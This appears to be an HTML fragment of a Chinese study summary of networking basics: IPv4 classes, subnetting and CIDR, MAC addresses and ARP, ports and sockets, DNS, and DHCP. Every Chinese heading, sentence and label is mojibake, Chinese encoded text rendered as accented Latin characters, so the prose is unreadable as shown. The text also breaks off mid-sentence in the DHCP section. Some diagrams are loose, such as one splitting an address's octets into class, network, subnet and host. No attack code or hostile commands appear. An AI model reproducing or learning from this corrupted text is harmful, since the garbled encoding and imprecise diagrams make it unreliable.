    <content type="html"><![CDATA[<h1>ç¬¬äºŒå‘¨æ€»ç»“ï¼šç½‘ç»œå±‚æ·±å…¥ç†è§£</h1><h2 id="æœ¬å‘¨å­¦ä¹ å›é¡¾">æœ¬å‘¨å­¦ä¹ å›é¡¾</h2><p>æ­å–œä½ å®Œæˆäº†ç¬¬äºŒå‘¨çš„å­¦ä¹ ï¼æœ¬å‘¨æˆ‘ä»¬æ·±å…¥å­¦ä¹ äº†ç½‘ç»œå±‚çš„æ ¸å¿ƒæ¦‚å¿µå’Œåè®®ã€‚è®©æˆ‘ä»¬ä¸€èµ·å›é¡¾è¿™ä¸€å‘¨çš„ç²¾å½©å†…å®¹ã€‚</p><hr><h2 id="ğŸ“š-æœ¬å‘¨çŸ¥è¯†åœ°å›¾">ğŸ“š æœ¬å‘¨çŸ¥è¯†åœ°å›¾</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs armasm">ç¬¬äºŒå‘¨ï¼šç½‘ç»œå±‚æ·±å…¥<br>â”œâ”€â”€ Day <span class="hljs-number">8</span>: <span class="hljs-built_in">IP</span>åœ°å€è¯¦è§£<br>â”‚   â”œâ”€â”€ IPv4åœ°å€ç»“æ„<br>â”‚   â”œâ”€â”€ <span class="hljs-built_in">IP</span>åœ°å€åˆ†ç±»ï¼ˆA/B/C/D/Eï¼‰<br>â”‚   â”œâ”€â”€ å…¬æœ‰<span class="hljs-built_in">IP</span> vs ç§æœ‰<span class="hljs-built_in">IP</span><br>â”‚   â”œâ”€â”€ ç‰¹æ®Š<span class="hljs-built_in">IP</span>åœ°å€<br>â”‚   â””â”€â”€ <span class="hljs-built_in">IP</span>åœ°å€åˆ†æå·¥å…·<br>â”‚<br>â”œâ”€â”€ Day <span class="hljs-number">9</span>: å­ç½‘åˆ’åˆ†ä¸CIDR<br>â”‚   â”œâ”€â”€ å­ç½‘æ©ç åŸç†<br>â”‚   â”œâ”€â”€ CIDRè¡¨ç¤ºæ³•<br>â”‚   â”œâ”€â”€ å­ç½‘è®¡ç®—æ–¹æ³•<br>â”‚   â”œâ”€â”€ VLSMå¯å˜é•¿å­ç½‘<br>â”‚   â””â”€â”€ å­ç½‘è®¡ç®—å™¨<br>â”‚<br>â”œâ”€â”€ Day <span class="hljs-number">10</span>: MACåœ°å€ä¸ARP<br>â”‚   â”œâ”€â”€ MACåœ°å€ç»“æ„<br>â”‚   â”œâ”€â”€ OUIå‚å•†æ ‡è¯†<br>â”‚   â”œâ”€â”€ ARPå·¥ä½œåŸç†<br>â”‚   â”œâ”€â”€ ARPç¼“å­˜æœºåˆ¶<br>â”‚   â””â”€â”€ ARPæ‰«æå·¥å…·<br>â”‚<br>â”œâ”€â”€ Day <span class="hljs-number">11</span>: ç«¯å£å’ŒSocketæ·±å…¥<br>â”‚   â”œâ”€â”€ ç«¯å£æ¦‚å¿µï¼ˆ<span class="hljs-number">0</span>-<span class="hljs-number">65535</span>ï¼‰<br>â”‚   â”œâ”€â”€ å¸¸ç”¨ç«¯å£å·<br>â”‚   â”œâ”€â”€ Socketç¼–ç¨‹åŸºç¡€<br>â”‚   â”œâ”€â”€ TCP vs UDP<br>â”‚   â””â”€â”€ ç«¯å£æ‰«æå™¨<br>â”‚<br>â”œâ”€â”€ Day <span class="hljs-number">12</span>: DNSåè®®è¯¦è§£<br>â”‚   â”œâ”€â”€ DNSå±‚çº§æ¶æ„<br>â”‚   â”œâ”€â”€ DNSæŸ¥è¯¢æµç¨‹ï¼ˆé€’å½’/è¿­ä»£ï¼‰<br>â”‚   â”œâ”€â”€ DNSè®°å½•ç±»å‹<br>â”‚   â”œâ”€â”€ DNSç¼“å­˜æœºåˆ¶<br>â”‚   â””â”€â”€ DNSæŸ¥è¯¢å·¥å…·<br>â”‚<br>â””â”€â”€ Day <span class="hljs-number">13</span>: DHCPåè®®è¯¦è§£<br>    â”œâ”€â”€ DHCPå·¥ä½œåŸç†<br>    â”œâ”€â”€ DORAå››æ¬¡æ¡æ‰‹<br>    â”œâ”€â”€ <span class="hljs-built_in">IP</span>åœ°å€ç§Ÿçº¦ç®¡ç†<br>    â”œâ”€â”€ DHCPæŠ¥æ–‡æ ¼å¼<br>    â””â”€â”€ DHCPåˆ†æå·¥å…·<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ¯-æ ¸å¿ƒçŸ¥è¯†ç‚¹å›é¡¾">ğŸ¯ æ ¸å¿ƒçŸ¥è¯†ç‚¹å›é¡¾</h2><h3 id="1-IPåœ°å€ä½“ç³»">1. IPåœ°å€ä½“ç³»</h3><p><strong>IPv4åœ°å€ç»“æ„</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">192.168.1.100<br> |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> </span>|<br> |<span class="hljs-string">   </span>|<span class="hljs-string">   </span>|<span class="hljs-string"> +-- ä¸»æœºå·</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   </span>|<span class="hljs-string">   +---- å­ç½‘å·</span><br><span class="hljs-string"> </span>|<span class="hljs-string">   +-------- ç½‘ç»œå·</span><br><span class="hljs-string"> +------------ ç½‘ç»œç±»åˆ«</span><br></code></pre></td></tr></table></figure><p><strong>IPåœ°å€åˆ†ç±»</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>ç±»ï¼š<span class="hljs-number">1.0.0.0</span> - <span class="hljs-number">126.255.255.255</span><br>     <span class="hljs-number">0</span>xxxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     ç”¨é€”ï¼šå¤§å‹ç½‘ç»œ<br><br>Bç±»ï¼š<span class="hljs-number">128.0.0.0</span> - <span class="hljs-number">191.255.255.255</span><br>     <span class="hljs-number">10</span>xxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     ç”¨é€”ï¼šä¸­å‹ç½‘ç»œ<br><br>Cç±»ï¼š<span class="hljs-number">192.0.0.0</span> - <span class="hljs-number">223.255.255.255</span><br>     <span class="hljs-number">110</span>xxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>     ç”¨é€”ï¼šå°å‹ç½‘ç»œ<br><br>Dç±»ï¼š<span class="hljs-number">224.0.0.0</span> - <span class="hljs-number">239.255.255.255</span><br>     ç”¨é€”ï¼šç»„æ’­<br><br>Eç±»ï¼š<span class="hljs-number">240.0.0.0</span> - <span class="hljs-number">255.255.255.255</span><br>     ç”¨é€”ï¼šä¿ç•™/å®éªŒ<br></code></pre></td></tr></table></figure><p><strong>ç§æœ‰IPåœ°å€</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>        â†’ Aç±»ç§æœ‰<br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>     â†’ Bç±»ç§æœ‰<br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>    â†’ Cç±»ç§æœ‰<br></code></pre></td></tr></table></figure><h3 id="2-å­ç½‘åˆ’åˆ†">2. å­ç½‘åˆ’åˆ†</h3><p><strong>å­ç½‘æ©ç ä½œç”¨</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">IPåœ°å€ï¼š    <span class="hljs-number">192.168.1.100</span>   <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">01100100</span><br>å­ç½‘æ©ç ï¼š  <span class="hljs-number">255.255.255.0</span>   <span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>ç½‘ç»œåœ°å€ï¼š  <span class="hljs-number">192.168.1.0</span>     <span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000000</span> (ANDè¿ç®—)<br></code></pre></td></tr></table></figure><p><strong>CIDRè®¡ç®—</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">CIDR    å­ç½‘æ©ç            å¯ç”¨ä¸»æœºæ•°    ç”¨é€”<br>/<span class="hljs-number">8</span>      <span class="hljs-number">255.0.0.0</span>         <span class="hljs-number">16,777,214</span>    å¤§å‹ç½‘ç»œ<br>/<span class="hljs-number">16</span>     <span class="hljs-number">255.255.0.0</span>       <span class="hljs-number">65</span>,<span class="hljs-number">534</span>        ä¸­å‹ç½‘ç»œ<br>/<span class="hljs-number">24</span>     <span class="hljs-number">255.255.255.0</span>     <span class="hljs-number">254</span>           å°å‹ç½‘ç»œ<br>/<span class="hljs-number">25</span>     <span class="hljs-number">255.255.255.128</span>   <span class="hljs-number">126</span>           å°å‹å­ç½‘<br>/<span class="hljs-number">26</span>     <span class="hljs-number">255.255.255.192</span>   <span class="hljs-number">62</span>            æ›´å°å­ç½‘<br>/<span class="hljs-number">30</span>     <span class="hljs-number">255.255.255.252</span>   <span class="hljs-number">2</span>             ç‚¹å¯¹ç‚¹é“¾è·¯<br></code></pre></td></tr></table></figure><p><strong>å­ç½‘åˆ’åˆ†ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">åŸç½‘ç»œï¼š<span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span><br><br>åˆ’åˆ†ä¸º<span class="hljs-number">4</span>ä¸ªå­ç½‘ï¼ˆ/<span class="hljs-number">26</span>ï¼‰ï¼š<br>â”œâ”€â”€ <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">26</span>    (<span class="hljs-number">192.168.1.1</span> - <span class="hljs-number">192.168.1.62</span>)<br>â”œâ”€â”€ <span class="hljs-number">192.168.1.64</span>/<span class="hljs-number">26</span>   (<span class="hljs-number">192.168.1.65</span> - <span class="hljs-number">192.168.1.126</span>)<br>â”œâ”€â”€ <span class="hljs-number">192.168.1.128</span>/<span class="hljs-number">26</span>  (<span class="hljs-number">192.168.1.129</span> - <span class="hljs-number">192.168.1.190</span>)<br>â””â”€â”€ <span class="hljs-number">192.168.1.192</span>/<span class="hljs-number">26</span>  (<span class="hljs-number">192.168.1.193</span> - <span class="hljs-number">192.168.1.254</span>)<br></code></pre></td></tr></table></figure><h3 id="3-MACåœ°å€ä¸ARP">3. MACåœ°å€ä¸ARP</h3><p><strong>MACåœ°å€ç»“æ„</strong>ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span><br>â”‚     â”‚  â”‚     â”‚<br>â”‚     â”‚  â”‚     â””â”€ è®¾å¤‡å·ï¼ˆå‚å•†åˆ†é…ï¼‰<br>â”‚     â”‚  â””â”€â”€â”€â”€â”€â”€â”€ è®¾å¤‡å·<br>â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ è®¾å¤‡å·<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ <span class="hljs-variable constant_">OUI</span>ï¼ˆå‚å•†æ ‡è¯†ï¼‰<br><br>ç¤ºä¾‹ï¼š<br><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> â†’ <span class="hljs-title class_">VMware</span><br>08<span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">27</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> â†’ <span class="hljs-title class_">VirtualBox</span><br><span class="hljs-variable constant_">AC</span><span class="hljs-symbol">:DE</span><span class="hljs-symbol">:</span><span class="hljs-number">48</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span> â†’ <span class="hljs-title class_">Apple</span><br></code></pre></td></tr></table></figure><p><strong>ARPå·¥ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">åœºæ™¯ï¼šä¸»æœº<span class="hljs-keyword">A</span> (<span class="hljs-number">192.168.1.10</span>) è¦å‘é€æ•°æ®ç»™ä¸»æœºB (<span class="hljs-number">192.168.1.20</span>)<br><br><span class="hljs-number">1</span>. ä¸»æœº<span class="hljs-keyword">A</span>æ£€æŸ¥ARPç¼“å­˜<br>   â””â”€ æ²¡æœ‰<span class="hljs-number">192.168.1.20</span>çš„MACåœ°å€<br><br><span class="hljs-number">2</span>. ä¸»æœº<span class="hljs-keyword">A</span>å¹¿æ’­ARPè¯·æ±‚<br>   æºMAC: aa:bb:cc:dd:ee:ff<br>   æºIP:  <span class="hljs-number">192.168.1.10</span><br>   ç›®æ ‡MAC: ff:ff:ff:ff:ff:ff (å¹¿æ’­)<br>   ç›®æ ‡IP: <span class="hljs-number">192.168.1.20</span><br>   é—®é¢˜: &quot;<span class="hljs-number">192.168.1.20</span>çš„MACåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ&quot;<br><br><span class="hljs-number">3</span>. ä¸»æœºBæ”¶åˆ°è¯·æ±‚ï¼Œå•æ’­ARPå“åº”<br>   æºMAC: <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span><br>   æºIP:  <span class="hljs-number">192.168.1.20</span><br>   ç›®æ ‡MAC: aa:bb:cc:dd:ee:ff<br>   ç›®æ ‡IP: <span class="hljs-number">192.168.1.10</span><br>   å›ç­”: &quot;æˆ‘æ˜¯<span class="hljs-number">192.168.1.20</span>ï¼ŒMACæ˜¯<span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>&quot;<br><br><span class="hljs-number">4</span>. ä¸»æœº<span class="hljs-keyword">A</span>æ›´æ–°ARPç¼“å­˜<br>   <span class="hljs-number">192.168.1.20</span> â†’ <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span><br><br><span class="hljs-number">5</span>. ä¸»æœº<span class="hljs-keyword">A</span>å°è£…æ•°æ®å¸§å‘é€<br>   ç›®æ ‡MAC: <span class="hljs-number">11:22:33:44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span> âœ…<br></code></pre></td></tr></table></figure><h3 id="4-ç«¯å£ä¸Socket">4. ç«¯å£ä¸Socket</h3><p><strong>ç«¯å£åˆ†ç±»</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">0</span>-<span class="hljs-number">1023</span>      ç³»ç»Ÿç«¯å£ï¼ˆWell-Known Portsï¼‰<br>            éœ€è¦ç®¡ç†å‘˜æƒé™<br>            ç¤ºä¾‹ï¼š<span class="hljs-built_in">HTTP</span>(<span class="hljs-number">80</span>)ã€<span class="hljs-built_in">HTTPS</span>(<span class="hljs-number">443</span>)ã€<span class="hljs-built_in">SSH</span>(<span class="hljs-number">22</span>)<br><br><span class="hljs-number">1024</span>-<span class="hljs-number">49151</span>  æ³¨å†Œç«¯å£ï¼ˆRegistered Portsï¼‰<br>            ç”±IANAåˆ†é…<br>            ç¤ºä¾‹ï¼š<span class="hljs-built_in">MySQL</span>(<span class="hljs-number">3306</span>)ã€<span class="hljs-built_in">Redis</span>(<span class="hljs-number">6379</span>)<br><br><span class="hljs-number">49152</span>-<span class="hljs-number">65535</span> åŠ¨æ€ç«¯å£ï¼ˆDynamic Portsï¼‰<br>            ä¸´æ—¶ç«¯å£ã€å®¢æˆ·ç«¯ç«¯å£<br></code></pre></td></tr></table></figure><p><strong>å¸¸ç”¨ç«¯å£é€ŸæŸ¥</strong>ï¼š</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">åè®®/æœåŠ¡    ç«¯å£    è¯´æ˜<br>HTTP       <span class="hljs-number"> 80 </span>     ç½‘é¡µæµè§ˆ<br>HTTPS      <span class="hljs-number"> 443 </span>    åŠ å¯†ç½‘é¡µ<br>SSH        <span class="hljs-number"> 22 </span>     è¿œç¨‹ç™»å½•<br>FTP        <span class="hljs-number"> 21 </span>     æ–‡ä»¶ä¼ è¾“<br>Telnet     <span class="hljs-number"> 23 </span>     è¿œç¨‹ç»ˆç«¯<br>SMTP       <span class="hljs-number"> 25 </span>     é‚®ä»¶å‘é€<br>POP3       <span class="hljs-number"> 110 </span>    é‚®ä»¶æ¥æ”¶<br>IMAP       <span class="hljs-number"> 143 </span>    é‚®ä»¶æ¥æ”¶<br>DNS        <span class="hljs-number"> 53 </span>     åŸŸåè§£æ<br>DHCP        67/68   IPåœ°å€åˆ†é…<br>MySQL      <span class="hljs-number"> 3306 </span>   æ•°æ®åº“<br>PostgreSQL <span class="hljs-number"> 5432 </span>   æ•°æ®åº“<br>Redis      <span class="hljs-number"> 6379 </span>   ç¼“å­˜æ•°æ®åº“<br>MongoDB    <span class="hljs-number"> 27017 </span>  æ–‡æ¡£æ•°æ®åº“<br></code></pre></td></tr></table></figure><p><strong>TCP Socketæµç¨‹</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æœåŠ¡å™¨ç«¯ï¼š                     å®¢æˆ·ç«¯ï¼š<br><span class="hljs-function"><span class="hljs-title">socket</span><span class="hljs-params">()</span></span>                      <span class="hljs-built_in">socket</span>()<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">bind</span><span class="hljs-params">()</span></span>                         ---<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">listen</span><span class="hljs-params">()</span></span>                       <span class="hljs-built_in">connect</span>() â”€â”€â”€â”€â†’ ä¸‰æ¬¡æ¡æ‰‹<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">accept</span><span class="hljs-params">()</span></span> â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">recv</span><span class="hljs-params">()</span></span> â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ <span class="hljs-built_in">send</span>()<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">send</span><span class="hljs-params">()</span></span> â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’ <span class="hljs-built_in">recv</span>()<br>   â†“                             â†“<br><span class="hljs-function"><span class="hljs-title">close</span><span class="hljs-params">()</span></span>                        <span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><h3 id="5-DNSåè®®">5. DNSåè®®</h3><p><strong>DNSå±‚çº§ç»“æ„</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å®Œæ•´åŸŸåï¼šwww<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>.<br>           â”‚   â”‚       â”‚   â”‚<br>           â”‚   â”‚       â”‚   â””â”€ æ ¹åŸŸ<br>           â”‚   â”‚       â””â”€â”€â”€â”€â”€ é¡¶çº§åŸŸ(TLD)<br>           â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€äºŒçº§åŸŸ(SLD)<br>           â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€å­åŸŸ/ä¸»æœºå<br></code></pre></td></tr></table></figure><p><strong>DNSæŸ¥è¯¢æµç¨‹ï¼ˆé€’å½’+è¿­ä»£ï¼‰</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>. å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNSæœåŠ¡å™¨<br>   <span class="hljs-string">&quot;www.example.comçš„IPæ˜¯ä»€ä¹ˆï¼Ÿ&quot;</span><br><br><span class="hljs-number">2</span>. æœ¬åœ°DNS â†’ æ ¹DNSæœåŠ¡å™¨<br>   æ ¹DNS â†’ <span class="hljs-string">&quot;å»é—®.comæœåŠ¡å™¨ï¼Œåœ°å€æ˜¯X.X.X.X&quot;</span><br><br><span class="hljs-number">3</span>. æœ¬åœ°DNS â†’ <span class="hljs-selector-class">.com</span> DNSæœåŠ¡å™¨<br>   <span class="hljs-selector-class">.com</span> DNS â†’ <span class="hljs-string">&quot;å»é—®example.comçš„æƒå¨DNSï¼Œåœ°å€æ˜¯Y.Y.Y.Y&quot;</span><br><br><span class="hljs-number">4</span>. æœ¬åœ°DNS â†’ example<span class="hljs-selector-class">.com</span> æƒå¨DNS<br>   æƒå¨DNS â†’ <span class="hljs-string">&quot;www.example.comçš„IPæ˜¯93.184.216.34&quot;</span><br><br><span class="hljs-number">5</span>. æœ¬åœ°DNS â†’ å®¢æˆ·ç«¯<br>   <span class="hljs-string">&quot;ç­”æ¡ˆæ˜¯93.184.216.34&quot;</span><br><br>æ€»è€—æ—¶ï¼šé€šå¸¸<span class="hljs-number">50</span>-<span class="hljs-number">200ms</span><br></code></pre></td></tr></table></figure><p><strong>DNSè®°å½•ç±»å‹</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Aè®°å½•     â†’ IPv4åœ°å€        www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> â†’ <span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br>AAAAè®°å½•  â†’ IPv6åœ°å€        www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> â†’ <span class="hljs-number">2606</span>:<span class="hljs-number">2800</span>:<span class="hljs-number">220</span>:<span class="hljs-number">1</span>:...<br>CNAMEè®°å½• â†’ åˆ«å           blog<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> â†’ www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>MXè®°å½•    â†’ é‚®ä»¶æœåŠ¡å™¨      example<span class="hljs-selector-class">.com</span> â†’ mail<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> (ä¼˜å…ˆçº§<span class="hljs-number">10</span>)<br>NSè®°å½•    â†’ åŸŸåæœåŠ¡å™¨      example<span class="hljs-selector-class">.com</span> â†’ ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>TXTè®°å½•   â†’ æ–‡æœ¬ä¿¡æ¯        ç”¨äºSPFã€DKIMéªŒè¯<br>PTRè®°å½•   â†’ åå‘è§£æ        IP â†’ åŸŸå<br></code></pre></td></tr></table></figure><p><strong>DNSç¼“å­˜å±‚çº§</strong>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">æµè§ˆå™¨ç¼“å­˜ (å‡ åˆ†é’Ÿ)<br>    â†“<br>æ“ä½œç³»ç»Ÿç¼“å­˜ (æ ¹æ®TTL)<br>    â†“<br>è·¯ç”±å™¨ç¼“å­˜ (æ ¹æ®TTL)<br>    â†“<br>æœ¬åœ°DNSæœåŠ¡å™¨ç¼“å­˜ (æ ¹æ®TTL)<br>    â†“<br>æƒå¨DNSæœåŠ¡å™¨ (çœŸå®æ•°æ®æº)<br></code></pre></td></tr></table></figure><h3 id="6-DHCPåè®®">6. DHCPåè®®</h3><p><strong>DORAå››æ¬¡æ¡æ‰‹</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs abnf">D - Discover   å®¢æˆ·ç«¯å¹¿æ’­ï¼š<span class="hljs-string">&quot;æœ‰DHCPæœåŠ¡å™¨å—ï¼Ÿ&quot;</span><br>O - Offer      æœåŠ¡å™¨å“åº”ï¼š<span class="hljs-string">&quot;è¿™é‡Œæœ‰ä¸ªIPï¼š192.168.1.100&quot;</span><br>R - Request    å®¢æˆ·ç«¯å¹¿æ’­ï¼š<span class="hljs-string">&quot;æˆ‘è¦192.168.1.100&quot;</span><br>A - Ack        